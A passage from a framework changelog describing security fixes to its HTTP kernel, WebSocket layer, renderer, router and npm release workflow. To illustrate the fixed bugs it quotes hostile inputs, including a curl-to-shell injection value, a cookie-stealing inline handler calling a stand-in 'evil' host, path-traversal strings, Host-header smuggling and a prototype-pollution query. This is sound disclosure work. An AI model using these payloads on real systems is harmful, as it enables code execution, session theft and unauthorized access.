- **A render could be driven into unbounded recursion from data.** `resolveThunks` bounds its
  unwrap specifically to survive a getter that returns a getter forever, and at the bound returns
  the value still as a function - whereupon `serializeChild` called itself on it, landed back in
  the same branch, and resolved to a function again. The cap was real; its caller undid it. The
  child-array branch had no bound of its own, so an array containing itself did the same. Both
  came out of the render entry point as an uncaught `RangeError`, killing the request.

- **A malformed percent-escape answered 404 where the router's own comment promised 400.** A `%`
  not followed by two hex digits is not a valid URI (RFC 3986 2.1), so the target is malformed
  rather than unknown, and RFC 9110 15.5.1 makes that a 400 - which Express and Fastify both
  return. The router reported it as a routing miss and the app layer turned every miss into a
  404. `RouteResult` gains a `decode-error` kind, which is what the comment described all along.

- **Editor projects and caches grew without bound.** One `ts.LanguageService`, program and lib
  set materializes per nearest-tsconfig directory touched - roughly 48 MB resident each - and the
  only eviction was workspace-folder REMOVAL, which a session never performs. Browsing a
  repository with a few dozen package directories drove the extension host past a gigabyte. The
  same shape existed with no eviction at all in the ESLint project pool and the tsserver plugin's
  compiled-file cache. All three are now bounded, least-recently-used first.

- **`tsconfig.json` discovery walked to the filesystem root.** A config placed ABOVE the folder
  the editor opened was found and obeyed, and a tsconfig is not inert: `files`/`include` pull
  arbitrary `.ts` into the program - whose contents come back quoted verbatim in type errors -
  and `paths` redirects module resolution, so go-to-definition lands wherever the config chose.
  The walk now stops at the opened workspace folder, which is the line Workspace Trust draws.

- **Which frames an application saw before a protocol violation depended on TCP segmentation.**
  `push()` accumulated frames in a local array and threw on reaching the bad one, so everything
  parsed earlier in that call was discarded with the array - while the same bytes arriving in
  separate segments had already been returned and delivered. The peer chooses the segmentation.
  Fuzzing put it at 6,204 of 50,000 cases. No capability is gained by an attacker, since they
  decide whether to send the malformed frame at all, so this is a determinism defect rather than
  an exploit - but it contradicted the rule `socket.ts` already states for `[close][text]`:
  everything up to the terminating event is delivered, nothing after. A frame that completed
  before the violation arrived while the connection was healthy, and is now delivered either way.
  `ProtocolError` carries them on a new `frames` field.

- **`<` and a backtick were missing from the invalid-attribute-name set.** Not exploitable alone -
  a spec tokenizer keeps `a<b` as a single attribute name - but the name is written straight into
  the tag, and a serializer interpolating attacker text should not be the thing deciding which
  delimiters happen not to matter today.

- **The language server's document gate ignored the URI scheme.** `uri.endsWith('.azeroth')`
  admitted `http://evil/x.azeroth`, which then keyed a language service on whatever the path
  conversion made of it. `uriToPath` also applied a single `decodeURIComponent` with no
  normalization afterwards, so `%2e%2e` reached the filesystem as a live `..` - the one point in
  the pipeline where an encoded traversal is visible as one. Both are closed.

### Fixed (templates)

- **Every scaffolded app was born failing its own `azeroth check`.** The shipped ESLint config
  sets `brace-style: allman` and also pulls in `js/recommended`, which carries
  `no-unexpected-multiline` - and Allman puts a multi-line call's opening paren on its own line,
  which that rule reads as two statements. The two cannot both hold. The fullstack template's own
  `createRouter` call tripped it, so `npm run check` failed on a freshly created project before a
  line of user code existed. There is no ASI hazard in the pattern (a parenthesis there can only
  continue the call), so the rule is off and the house style stands. The monorepo's own config had
  the same latent conflict and got the same treatment. Only booting a scaffolded app surfaces
  this: the monorepo's linter ignores `templates/`, and the template specs are not collected by
  the monorepo's test runner.

### Security (http kernel)

An adversarial audit across every package reproduced each of the following against real sockets
and real browsers. The pattern worth naming, because it explains all of them: the kernel's
guarantees held exactly as documented, and nothing OUTSIDE the kernel re-established them.

- **The routed path was built from the client-controlled `Host` header.** `AdapterRequest.url`
  composed `${scheme}://${authority}${target}` from raw `headers.host`, of which only
  `X-Forwarded-Host` was ever validated, and the kernel recovers the path by scanning for the
  first `/` after `://`. A `/`, `?` or `#` inside `Host` therefore moved the authority/path
  boundary: `GET / HTTP/1.1` with `Host: h/admin` executed the `/admin` handler, and
  `GET /admin` with `Host: h?x` executed `/admin` while `context.url.pathname` reported `/`.
  Every layer that reasons about the path disagreed with the router - an ingress or WAF path
  rule saw `/`, an in-app prefix guard saw `/`, and the shipped request logger recorded `/` or,
  for a `Host` that would not parse at all, nothing. `Host` is now validated with the same
  grammar `X-Forwarded-Host` already used, falling back to `localhost`.

- **`context.path` is new, and it is the path to make policy decisions on.** The router matches
  decoded segments, so `/%61dmin` is the route `/admin` - while `url.pathname` preserves the
  client's spelling, so a prefix check written on it could be bypassed by re-spelling the path
  that still reached the protected handler. There was no canonical path available to compare
  against; now there is one. (An empty segment, `//admin`, was in that set when this landed and
  is no longer: see the entry above, which stops the router matching such a path at all.)

- **A single request could kill the process, through five reachable triggers.** `App.handle`
  cannot reject, but the layers around it could, and nothing caught them: the node adapter
  dispatched into a bare `.then()`, `pipeline()` had no error path at all, and no
  `unhandledRejection` handler existed anywhere in the framework, so Node's default policy
  (terminate) applied. Confirmed triggers: a CORS `origin` predicate throwing on the
  `Origin: null` that sandboxed iframes send by themselves; a rate-limit store rejecting, which
  the module's own docs invite by recommending Redis; `writeHead` throwing on an out-of-range
  status or a CRLF in an error header; and `errorResponse` itself throwing from inside
  `handle`'s catch on a `details` payload containing a BigInt or a cycle. `pipeline()` now
  terminates the error path the way `App.handle` does, and the adapter catches whatever still
  escapes, answering 500 before headers are sent and destroying the connection after.

- **The last-resort error path could no longer fail.** `encodeError` guards its own
  `JSON.stringify` and degrades to the envelope, `String(error)` is replaced by a stringifier
  safe for a thrown value with no primitive conversion, and an error's mandated headers are
  normalised through real `Headers` (which rejects CRLF and NUL) with the framing headers
  re-asserted last, so a supplied `content-length` can no longer declare a length the body does
  not have and desynchronise a keep-alive connection.

- **`dev:false` published `HttpError.details` on a 5xx while hiding the message.** `details` now
  follows the message rule: a 4xx still carries it (the 422 validation field map is the
  documented form contract and is unaffected), a 5xx does not. A DSN with credentials and the
  SQL that failed were previously returned to the client on a 500.

- **A response header written the standard way could be silently dropped in production.**
  `PayloadResponse.headers` materialises a detached view, and the adapter wrote only the raw
  record, so `response.headers.set('cache-control', 'no-store')` in middleware was reported by
  `app.handle()` - the entire documented testing story - and never reached the socket. A
  `Set-Cookie` added that way was dropped in production while the test asserting it passed.
  Once the view exists it is now the truth `raw()` reports.

- **Middleware additions can no longer forge the context.** Additions were `Object.assign`ed
  flat, including over the reserved `request`, `params` and `url` keys, so a middleware
  returning parsed request data (`app.use((c) => readJson(c.request))`) let a body of
  `{"params":{"id":"admin"}}` replace the path params a handler authorises on. Reserved keys are
  skipped and only own properties are copied.

- **A registered route could be unreachable with no warning.** The router's backtracking reacted
  only to STRUCTURAL dead ends, so a static terminal holding a different method ended the walk:
  `app.get('/users/me')` made `app.post('/users/:id')` answer 405 for that one id, and a static
  GET shadowed a wildcard POST the same way. The verb is now part of the match, and the 405's
  `Allow` reports every method reachable at that path rather than one terminal's.

- **An aborted streaming request leaked whatever its cleanup owned.** Cleanups were deferred to
  the response body, which runs them from `pull` or `cancel` - but an adapter that finds the
  socket already destroyed dropped the response without reading or cancelling it, so
  `onRequestCleanup` never ran: pooled connections stayed checked out and transactions stayed
  open, which is pool exhaustion under repetition. The request's abort signal now also settles
  the root, and the adapter cancels the body it cannot write.

- **`json()`/`text()`/`html()` at 204, 205 or 304 declared a `Content-Length` with no body**,
  which RFC 9112 section 6.2 forbids and which is the shape a framing desync is built from.

### Security (compiler)

- **A carriage return in any emitted string literal produced INVALID JavaScript, and the Windows
  default checkout triggered it.** The literal escaper handled `\`, `'` and `\n` but not U+000D,
  and a raw CR inside a single-quoted JS literal is a LineTerminator, so the emitted module was a
  syntax error. Five paths delivered one, including `<style>`/`<script>` raw text and static
  attribute values, which means `core.autocrlf=true` (Git for Windows' default) plus any
  multi-line `<style>` failed the build - and the error was misattributed to the author's markup
  rather than the compiler's escaping. U+2028 and U+2029 are now escaped too, and the emitted
  module is validated with a real `node --check` in the regression tests.

- **A whitespace run with no newline made text normalisation quadratic.** Measured 18,263 ms
  through `generateModule` for 160,000 spaces, versus 2.4 ms after. It matters far beyond a build:
  the same normalisation runs in `lintSource` and `generateVirtualCode`, which the language server
  and the ESLint processor execute on every keystroke, so one such file made the editor
  unresponsive. The newline test now happens in JavaScript rather than inside the pattern, so
  there is nothing left to backtrack.

- **`emitDeclarations` wrote generated `.d.ts` files OUTSIDE the Vite root and overwrote existing
  ones.** For any `.azeroth` module resolved outside the root (a monorepo sibling, a linked
  workspace), the relative path began with `..` segments that path joining then normalised away,
  climbing out of the mirror directory and then out of the root. Confirmed destructive: a
  hand-written `Shared.d.ts` outside the root was replaced with generated content. Every write now
  verifies containment first and skips rather than escaping.

- **A static `innerHTML=` or `textContent=` rendered differently in the two modes.** The dynamic
  path checked the DOM-property table and the static path did not, so the value was baked into the
  template string as an inert lowercased attribute in the clone path while the SSR path treated it
  as raw content. One artifact, two different DOMs, and the type check reported nothing. Both
  paths now go through the same property write, including through the constant-folding door, which
  was the same defect by another route.

- Also: character references now decode in a static attribute value as they always did in text
  (`title="Tom &amp; Jerry"` rendered the literal entity before), and the markup depth cap is
  threaded through expression holes in all three walkers, so deeply nested markup raises a LOCATED
  compile error instead of an unhandled `RangeError` out of `generateVirtualCode` - the single
  projection behind the language service, the TS plugin, the ESLint processor and the type checker.

### Security and correctness (CLI, packaging, release)

- **`release.mjs --no-bump` published without verifying the tree, the tag, the version or the
  branch.** The clean-tree check sat inside the bump branch, so a dirty tree published as-is and
  `npm publish` packs the working tree rather than the tag; `--skip-checks` skipped the only step
  that clears `dist/`; the version being published was never cross-checked against any manifest,
  so it could differ from the one the dist-tag moved; and nothing checked the branch, with publish
  happening before push so a missing tag was discovered only after the registry had been mutated.
  Confirmed: a run from a tree with 37 modified files was accepted and would have published all
  fifteen packages at the wrong version, then moved `latest` to a version never published. The
  clean-tree check now covers any publishing run, `--no-bump` asserts the manifest version matches
  and that the tag exists and points at HEAD, and a branch guard with `--allow-branch` covers runs
  that create history. `--skip-checks` while publishing now says out loud that every `dist/` on
  disk ships as-is.

- **The npm OTP was printed once per package, thirty times per release.** The command log included
  the full argv, and npm accepts long-lived reusable RECOVERY codes as well as short-lived TOTP,
  so a pasted log or a CI artifact could hand over publish authority. The code now travels in
  `NPM_CONFIG_OTP` and never appears in an argv, with a redactor left on the logging path as a
  standing guard.

- **`azeroth upgrade` could not run at all on Windows.** It spawned `npm.cmd` with `shell: false`,
  which the CVE-2024-27980 fix refuses on every Node the package supports, so the verb always
  failed and reported it as a registry error. npm is now reached through its entry script with an
  argument array and no shell, matching what every other child spawn in the CLI already did.

- **`azeroth upgrade` also destroyed dependency specifiers it should never have touched.** The pin
  rewrite matched any azeroth-scoped key anywhere in the manifest TEXT and replaced the whole
  value, so `file:`, `workspace:`, `git:` and multi-part ranges were all overwritten with an exact
  version, in `peerDependencies` and `overrides` as well - a library author who ran it then
  published an unsatisfiable peer constraint to every consumer. It now parses the manifest, walks
  only the three dependency sections, rewrites only plain semver pins, and reports what it skipped.

- **`create-azeroth` could scaffold outside the working directory**, including to the drive root,
  because the name pattern allowed `.` and `/`. The name must now be a single npm-shaped package
  segment and the resolved target is asserted to be inside the working directory.

- **Every published tarball shipped sourcemaps whose sources were not in the tarball**, 494 files
  and 1.49 MB of dead weight that actively misdirected stack traces and go-to-definition. Maps are
  excluded from the published files while staying on disk for local development: 1,123 files down
  to 629, and `publint` still passes for all fifteen packages.

- Also: `mountPages` now fails at request time with an error naming `clientDir` and both filenames
  it looked for, instead of killing the process with a bare ENOENT from an unhandled rejection at
  boot; `kit prerender` asserts its output path stays inside the output directory, so a route path
  containing `..` is a build error rather than a write two levels up; `azeroth doctor` no longer
  reports a spawn hazard because a file merely mentions `shell: true` in a comment (it flagged this
  repository's own release script) and now catches a real one in a file with no `spawn(` call; and
  the publish smoke gate checks the `bin` targets of every installed package rather than one,
  which is 6 instead of 3.

### Fixed (CLI and the fullstack template)

- **A freshly scaffolded fullstack app died at boot.** Found by booting a real scaffold rather
  than by any test. The template guarded its devtools call on `config.env === 'development'` - a
  value `loadConfig` DEFAULTS when nothing is set - while `attachDevtools` checks the raw
  `process.env.NODE_ENV`. A scaffold ships no `.env`, so nothing set it: the template's branch was
  true, the bridge it called refused, and the exception took the process down at module scope. The
  two sides were reading different facts about the same thing.

  Fixed on both sides, and neither alone is enough. `azeroth dev` now DECLARES
  `NODE_ENV=development` to its children when nothing has set it, because `dev` is the development
  command and the framework's dev-only gates check that value positively (an unset variable has to
  mean "not development", or a production deploy that forgot it would open them). And the template
  now reads the same raw variable the bridge does, so a bare `node src/main.ts` with no environment
  boots cleanly with the bridge simply not attached. `npm run dev` gets the panel; nothing else
  does. Verified in all three states: unset, `development`, and through the CLI.

### Security (renderer, stricter than React by choice)

Three positions the framework previously shared with React are now tightened, each with an
explicit escape hatch. The framework targets banks, exchanges and payment gateways, where the
cost of an unexpected refusal is a build error and the cost of a permissive default is an
incident.

- **Dangerous URL schemes are refused** on `href`, `src`, `action`, `formaction`, `poster`,
  `xlink:href` and `data`: `javascript:`, `vbscript:`, and any `data:` that is not an image.
  `data:image/svg+xml` stays refused, because SVG carries script. The candidate is normalised
  before its scheme is read, so `java\tscript:` cannot slip past. `srcdoc` is refused outright.
  Ordinary URLs and inline `data:image/png` are untouched, and `unsafeUrl(value)` is the opt-out.
  Applied through the SAME gate on both render paths, because a divergence between them is one of
  the defects this session already fixed. Fixing it surfaced a real parity bug: the serializer
  called the gate with the RAW prop, so a reactive `href={() => evil()}` was checked on the client
  and unchecked on the server.

- **Executable tag names are refused** in `h()`: a `<script>` that would actually run (no `type`,
  or a JavaScript MIME), plus `base`, `object` and `embed`. `iframe` stays allowed, because every
  video and payment embed is one, and so does a data-block `script` such as
  `application/ld+json`, which is a documented pattern with dedicated escaping in the serializer.
  `unsafeTag(name)` is the opt-out. Note this covers `h()`, not static markup: a `<script>` written
  literally in a `.azeroth` file is compiled into a cloned template and never reaches `h()`, which
  is the author writing a script tag deliberately rather than a tag name arriving from data.

- **Hydration strips injected event-handler attributes.** Adoption applied the client's props over
  whatever the server sent and kept the rest, so an `on*` attribute smuggled into the server HTML
  survived onto the live page. The client never legitimately sets an `on*` ATTRIBUTE, so any found
  during adoption is removed. Creation is untouched.

- **A leaving `Transition` or `TransitionGroup` row stops being interactive.** Both kept the
  element in the DOM with its handlers and reactive scope alive for the whole leave animation, up
  to a one second fallback, so a "Confirm payment" button was clickable while it animated away.
  Both now carry one framework-owned attribute and one injected, author-overridable
  `pointer-events: none` rule; no inline style is ever mutated. `TransitionGroup` had the same
  defect as its sibling and was not in the original finding, which is the pattern this whole audit
  kept turning up.

### Security (contract layer, second pass)

- **BREAKING: `only()` returns a wrapper object rather than a branded array.** The brand was a
  value property, so it survived at runtime but was erased by ANY widening annotation - a
  `ReadonlyArray<Guard>` variable, a `GuardMap`-annotated map, a helper's declared return. An
  erased brand meant the mount dropped the inherited chain while the handler stayed typed with the
  additions of guards that never ran, which is exactly the bug `only()` exists to prevent. A
  wrapper is not an array, so that assignment is now a compile error and the two sides cannot
  disagree. Migration: nothing changes at the call site, `only([...])` still reads the same; only
  code that spread or indexed the RESULT needs updating.

- **BREAKING: a guard promises only what it actually attaches.** `guard()` inferred its additions
  from a union that already contained `undefined | void`, so the everyday optional-session guard -
  one with a conditional `return;` - still typed its additions as definitely-present. Every
  handler behind it read `context.accountId` as a `number` while the anonymous path reached it
  with the field absent, which is a latent null dereference on precisely the requests that carried
  no credential. A guard that attaches on every path is now an `ExactGuard` and keeps exact types;
  one that can attach nothing types its additions OPTIONAL and the handler has to narrow.

- **A guard chain's additions are intersected, not unioned.** Two guards on one key both
  `Object.assign` onto the same context, so both fields are present, but the type modelled that as
  "one or the other". Unpinned by any test, and wrong in the direction that lets a handler miss a
  field the chain guarantees.

- **The typed client could execute a DIFFERENT route than the one it was called on.** A `:name`
  path param was percent-encoded and a `*name` wildcard was interpolated RAW, so
  `client.files.read({ params: { path: '../../admin/keys' } })` issued `GET /admin/keys` with the
  client's configured auth headers attached and returned that route's body under the calling
  route's declared type. Wildcard segments are now encoded individually - `/` survives, since a
  wildcard is legitimately multi-segment - and a `.` or `..` segment is refused outright.

- **The typed client followed redirects off-origin.** `redirect` was never set, so the fetch
  default `follow` carried the configured headers (an API key, not just the `Authorization` the
  spec strips) to whatever origin a `Location` named, then resolved with that origin's body typed
  as the route's declared output. It is now `redirect: 'error'`: a contract route never
  legitimately answers with a redirect the typed client should follow.

- **The typed client now checks what it is handed, within a bound.** A 2xx body was returned with
  no schema check and no byte cap, on both the success and the error path, so every consumer
  treated a compromised, proxied or legacy upstream's response as contract-shaped data. Bodies are
  validated against the route's declared schema and read within a 1 MiB default;
  `validateResponses: false` and `maxResponseBytes` are the escape hatches for a server the
  contract does not own.

- **Two contract keys could address one route.** Nothing validated key names, so a group `admin`
  holding `overview` and a top-level key spelled `'admin.overview'` computed the same dotted path:
  one handler served both HTTP routes, `'admin.*'` guards leaked onto the route outside the group,
  and OpenAPI emitted duplicate operation ids. A key containing `.` or `*`, or an empty key, is now
  refused where the contract is DECLARED, so the error names the author's own literal.

- **`merge()` reported a duplicate for a legitimate route key.** It tested `key in out` on a plain
  object, so a route keyed `toString` or `constructor` collided with `Object.prototype` on the
  first group. Same class as the prototype bugs already fixed in the mount.

- **A guard that reads the request body now says so.** Verifying an HMAC over the raw bytes is the
  reason to write such a guard, and it left the stream consumed so the mount's own read failed with
  a locked-stream error surfacing as an opaque 500. The mount now names the cause and the fix.

### Security (OpenAPI export and explorer)

- **The spec and the docs page were public by default, with a third-party CDN script.** Neither
  route had an environment gate, and `viewer` defaulted to Scalar, whose page loads an unpinned,
  SRI-less script from a CDN - onto a page developers open against production data and paste
  bearer tokens into. The default viewer is now the self-contained house explorer, and neither
  route registers under `NODE_ENV=production` unless the app passes `public: true`. A spec
  describes every internal route, its input shape and its constraints; publishing that should be a
  decision, not a default.

- **Component-name collisions silently corrupted the document.** `user.profile`, `user_profile`,
  `user-profile` and `userProfile` all pascal-case to `UserProfile`, and on collision the second
  schema OVERWROTE the first while both `$ref`s pointed at it - so a route was documented with a
  different route's body, and the document stayed valid OpenAPI. Names are now claimed and
  disambiguated deterministically, so rebuilds stay byte-identical.

- **The explorer died on any contract containing a multipart route**, because it dereferenced
  `content['application/json']` unconditionally while the exporter emits only
  `multipart/form-data`. The throw escaped after the pane was already cleared, so the page was left
  blank, and if the multipart operation came first the page never booted at all. It now reads the
  first declared media type, the way its own responses loop always did, and offers a JSON editor
  only for a JSON body. A reused multipart spec also no longer emits an orphan component.

### Fixed (http kernel, second pass)

- **A handler's reason phrase never reached the wire**: the adapter always called `writeHead`
  without it, so `new Response(body, { status: 418, statusText: 'I am a teapot' })` arrived with
  Node's default phrase.
- **A route pattern containing a percent escape was permanently unreachable.** Request paths are
  decoded per segment before matching but patterns never were, so `/my%20page` could only be
  reached by a double-encoded `/my%2520page` while sitting in the boot table looking served. It is
  now refused at registration, pointing at the decoded character. A bare `%` stays legal, because
  it is genuinely reachable.

### Security (release pipeline)

- **CRITICAL: expression injection in the npm publish workflow.** `.github/workflows/publish.yml`
  interpolated `${{ inputs.version }}` directly into a `run:` line, and Actions expands `${{ }}`
  TEXTUALLY into the shell script before bash parses it - inside the job holding
  `id-token: write`, the npm OIDC trusted-publishing identity for all fifteen packages. A dispatch
  input of `1.1.0 -y; curl -s https://evil/x.sh | sh; #` would execute with publish authority and
  could ship a malicious version carrying a VALID provenance attestation, which is the one thing
  provenance is supposed to make impossible. Trusted publishing means the reviewed workflow file
  is the only publish path, and this defeated that. The input now rides in through `env` and is
  referenced quoted, and a prior step rejects anything that is not a bare semantic version. The
  repository's own `release.yml` already used the safe pattern, so this was an inconsistency
  rather than an unknown.

### Security (WebSocket handshake and codec)

- **CRITICAL: cross-site WebSocket hijacking was the DEFAULT.** The origin check only ran when the
  application supplied a `verifyOrigin` callback, so out of the box any page on the internet could
  open an authenticated socket to a downstream app using the victim's cookies. WebSockets are
  exempt from CORS, so nothing else stopped it, and the natural way to authenticate an upgrade is
  to read `request.headers.cookie` - which means the app author does nothing wrong and still ships
  full session hijacking. On a trading platform that is order placement and balance exfiltration
  from any site the victim visits. The gate now always runs: with no callback, an Origin must name
  the same host and port the request was aimed at (parsed through `URL`, so IPv6 literals and
  implied ports hold), and anything else is refused 403. A request with NO Origin, which is what a
  non-browser client sends, stays allowed. The callback remains the override in both directions.
  This matches the default the `ws` npm package chose, but `@azerothjs/devtools` already wrote its
  own origin check, so the need was recognised one layer up and missed here.

- **CRITICAL: the frame parser was O(n^2), so an ordinary upload starved every other
  connection.** Every chunk allocated a new buffer and copied the whole retained one, and the
  chunk count is set by the network rather than the sender, so a plain 16 MiB frame cost 2 GiB of
  memcpy. Measured on the same input: 16 MiB arriving in 1400-byte segments went from **32,406 ms
  of blocked event loop to 32.9 ms**, and 8 MiB in 64 KiB reads from 173.5 ms to 15.5 ms. The
  parser now keeps a read/write window into a growable buffer, growth is clamped to the exact
  byte count the pending frame still needs (so a declared-but-unsent 16 MiB length cannot make it
  preallocate), the zero-copy single-chunk path is preserved, and it compacts only when the dead
  prefix outgrows half the capacity. A randomised-chunking test asserts any segmentation
  reassembles byte-identically to a single chunk.

- **A throw in the upgrade gate killed the process.** `verifyOrigin` and `onConnection` both run
  inside the server's `upgrade` listener, so a throw was an uncaught exception that took every
  other live socket with it - and the realistic trigger is mundane: an `onConnection` parsing a
  header, or a synchronous auth lookup failing because its backend is down. A throwing
  `verifyOrigin` now refuses with 500. A throwing `onConnection` cannot be a 500, because the 101
  is already on the wire by then, so that connection is closed with 1011 and its buffered replay
  skipped. `onMessage` and `onClose` throws were already contained, which is what made the gap
  easy to miss.

- **There was no connection cap.** Connections were tracked in an unbounded set, so combined with
  the per-connection parser buffer, 40 sockets held 641 MiB with no message ever completed: a
  slowloris that no available option could bound. `maxConnections` refuses past the cap with 503,
  checked before the origin gate and the handshake.

- **The server emitted illegal control frames.** The parser enforced the 125-byte control limit
  inbound while the serializer applied no check outbound, so a descriptive close reason (which
  routinely embeds user or peer input, making its length attacker-influenced) produced a frame a
  compliant peer MUST reject with 1002 - losing the application's close code entirely, so the
  client saw a protocol error instead of "order rejected". Codes were not validated either:
  `close(1006)` and `close(1005)` put codes on the wire that RFC 6455 section 7.4.1 says must
  never appear, and `close(70000)` silently aliased to 4464. Reasons are now truncated to 123
  bytes on a codepoint boundary, 1005 and 1006 map to an empty payload, an unsendable code is
  refused by the codec, and the serializer rejects an oversized control payload. `close()` itself
  stays total: it is a teardown path, so a forbidden code is normalised to 1000 rather than
  throwing, because a connection left open because its close code was wrong is the worse outcome.

- **The IANA close codes a gateway actually sends were rejected as protocol violations.** 1012
  (service restart), 1013 (try again later) and 1014 (bad gateway) all died with 1002, so a client
  could not distinguish "back off" from "you sent garbage" and would hot-retry into an already
  overloaded service. One predicate now serves both directions with the correct range.

- Conformance: a 64-bit length with the high bit set now closes with 1002 as the module's own
  header always claimed; `Upgrade` is parsed as the token list RFC 7230 defines, so
  `Upgrade: websocket, h2c` connects instead of being refused; and a `Host` header and HTTP/1.1 or
  later are required per RFC 6455 section 4.1.

### Security (WebSocket connection state)

- **CRITICAL: two remote memory-exhaustion kills, neither bounded by the documented cap.** The
  assembled-message limit counts BYTES, but RFC 6455 permits a zero-length fragment, so an endless
  stream of them adds nothing to the total while the fragment array grows forever: measured 34.9x
  wire-to-heap amplification, and 12 MB of traffic reaching a 512 MB heap ceiling with
  `maxMessage: 1024` explicitly set. One-byte fragments defeat it the same way, so raising the cap
  was no escape. Separately, every inbound ping was answered with an unconditional write and the
  read side was never paused, so a client that floods pings while refusing to read queued one
  userland write per ping: 13.7 MiB of pings grew the process to 751 MiB, while `bufferedAmount`
  under-reported it by two orders of magnitude because the per-write bookkeeping dominates, so an
  app watching that number saw nothing. Both are process kills, not dropped connections, so every
  other live socket dies with them. Fragments are now capped by count as well as size, and an
  automatic pong is dropped once the write queue is deep, which RFC 6455 section 5.5.3 explicitly
  permits.

- **Messages were delivered to `onMessage` AFTER `onClose` had already run.** The frame loop kept
  iterating a chunk after a close frame tore the connection down, so one TCP segment containing
  `[close][text]` ran the application's teardown and then handed it more messages. On an exchange
  that is an order executing against a released session; on a wallet it is a signing request
  processed after the auth context was dropped. The application could not defend against it,
  because the framework's own contract says `onClose` fires when the connection is over. The loop
  now stops at close, and `onMessage` is dropped alongside `onClose` with the data listener
  detached and the partial-assembly state released.

- **`drain()` never settled when the peer vanished**, because it waited only on the socket's
  `'drain'` event and a destroyed socket never emits one. That is the documented backpressure
  pattern (`if (!ws.send(x)) await ws.drain()`) meeting a slow consumer that then disconnects,
  which on a market feed is the most ordinary event there is: the producer loop was abandoned
  mid-iteration and its `finally` never ran, leaking whatever it held (a cursor, an advisory lock,
  a reserved sequence number) for the process lifetime. It now settles on close and error too.
  Against the old code the regression test does not fail fast, it hangs to the test timeout.

- **`pongTimeoutMs >= heartbeatMs` silently disabled half-open reclamation entirely.** The pong
  deadline was cleared and re-armed on every tick, so with a timeout at least as long as the
  interval the timeout branch was unreachable and a peer that vanished without a FIN was never
  terminated. `heartbeatMs: 30000, pongTimeoutMs: 30000` is a natural "give it a full interval to
  answer" choice, and it turned the one defence against half-open sockets into a no-op with no
  signal. A tick with a probe already outstanding now leaves the armed deadline alone.

- **A throwing `onError` escaped as an uncaught exception**, out of the very handler meant to
  contain failures, taking every other live connection with it. `onMessage` and `onClose` throws
  were already contained, which is what made the gap easy to miss. Every report now goes through
  one guarded path.

- **`maxPayload` was unreachable, so per-connection memory could not be bounded.** The parser
  enforced it but the socket constructed the parser without forwarding it, and the option was
  absent from `ServerSocketOptions`, so every connection was fixed at the 16 MiB default no matter
  what `maxMessage` said: an app setting `maxMessage: 1024` still let each socket pin a 16 MiB
  parser buffer, and 40 connections held 641 MiB with no message ever completed. It is now a real
  option, defaulting to `maxMessage`, enforced from the frame header before a byte is buffered.

### Security (renderer, router, reactivity)

- **A string-valued `on*` prop became a live inline event handler.** A prop counted as a handler
  only when its value was a FUNCTION; anything else fell through to `setAttribute`, so
  `onerror: "fetch('https://evil/?c='+document.cookie)"` was written as a live attribute. All
  three paths agreed and all three were wrong: the client DOM, the SSR serializer, and
  `bindProps`, which is what compiled `.azeroth` markup calls. The precondition is an app
  forwarding an untrusted object as props, which is an ordinary pattern rather than an abuse, and
  React refuses this case outright. Both paths now refuse it identically, reusing the policy the
  SSR serializer already applied to invalid attribute NAMES: fail loudly rather than emit it raw.
  The same gate closed the DOM path's missing name validation, so a hostile key in a data-driven
  attribute bag can no longer abort a render halfway and blank a page region.

- **SSR emitted `<script>` and `<style>` children verbatim, so the same component was inert
  client-rendered and live markup server-rendered.** Raw-text content is CDATA, but CDATA is
  closed by the element's own end tag and nothing neutralised it. The canonical JSON-LD pattern
  with a user-controlled product name injected into the served document. Only the
  element-terminating sequences are escaped, so legitimate content stays byte-identical.

- **The scoped-CSS registry was process-global, so one request's CSS was served to every later
  request and it grew without bound.** `collectStyleSheet()` returned every scope ever registered
  rather than the ones the current render touched, and nothing in the render path ever reset it.
  Two independent reviewers reproduced it and so did I: a `css` template interpolating an IBAN
  appeared in the next request's document, growing about 151 bytes per render and never releasing.
  String-mode `css()` calls are now recorded in a per-render frame that `collectStyleSheet()`
  drains, matching the seam pattern render mode and store scopes already use. Client behavior is
  unchanged.

- **The `css()` scope rewrite corrupted every asset URL.** A blanket regex over the whole
  stylesheet rewrote any `.identifier`, so `url(./logo.png)` became `url(./logo.png_<scope>)` and
  `content: ".done"` was altered - a silent 404 for every image and font referenced from scoped
  CSS, which survives review because the class names still work. The rewrite is now region-aware:
  quoted strings, `url(...)` bodies and comments are copied verbatim.

- **A throwing subscriber during a resource settle, and any `async` effect body that rejects,
  escaped as unhandled rejections that nothing could catch.** The settle chains had no terminal
  `.catch`, and `createEffect` discarded a returned promise entirely, so `catchError`,
  `<ErrorBoundary>` and `onUncaughtError` all saw nothing - and on Node an unhandled rejection
  terminates the process, making one malformed API payload a server crash the app could not
  defend against at the boundary the framework tells it to use. All three now route through the
  same last-resort path a synchronous effect error uses. `EffectFn` additionally declares
  `Promise<void>`, and its doc states the constraint the type cannot: an async body tracks only
  the reads that happen before the first `await`, and cannot register a cleanup.

- **Event delegation recomputed the propagation path DURING dispatch**, reading `parentNode` after
  each handler ran, while native dispatch computes the path first. So a handler that removed its
  own node truncated the walk and every ancestor handler was silently skipped, and a handler that
  REPARENTED its node delivered the event into a subtree that was never an ancestor. Delete and
  reorder buttons are ubiquitous, so close-the-dropdown, click-outside, audit and optimistic-list
  handlers stopped running with no error, and the reparent case acted on the wrong record. The
  ancestor chain is now snapshotted before the first handler runs. `stopImmediatePropagation()` is
  observed too, and the delegated-handler Symbols are cleared on `destroyComponent`.

- **`parseQuery` let the URL rewrite the returned object's prototype, and silently dropped a
  key.** `?__proto__=a&__proto__=b` (repeated, so the value is an array the prototype setter
  accepts) replaced the prototype of `location().query`, and a single `?__proto__=x` vanished
  entirely, so a query parameter could be made invisible to the app while still present in the URL
  and in any server-side log or signature check that parsed it correctly. The result is
  null-prototype now.

- **The URL scheme classifier and the click interception disagreed**, which is a bypass rather
  than a policy choice: the external-URL test allowed no whitespace, so `java\tscript:` was
  classified INTERNAL, intercepted, and pushed into history as an app path, while the browser
  strips those characters when resolving the rendered `href`. Control characters are now stripped
  before the test so the two paths cannot disagree. Note the absence of a `javascript:` allowlist
  is deliberate and matches React and React Router.

- Also: props are iterated own-keys-only, so a prototype-pollution gadget elsewhere can no longer
  inject attributes onto every element the renderer builds (React guards this path, so apps
  migrating from it were losing a defence); `hydrateIslands` uses `allSettled` with a per-anchor
  try/catch, so one malformed anchor no longer kills interactivity on the whole page, and an
  inherited registry key degrades to the documented no-loader warning instead of a crash; and
  `styleMap` rejects a property name from data and a value carrying `;` or `}` outside a quoted
  string or `url()` body.

### Security (devtools, schema, logger, cron)

- **BREAKING: the devtools server bridge now requires a token, and `attachDevtools(server)`
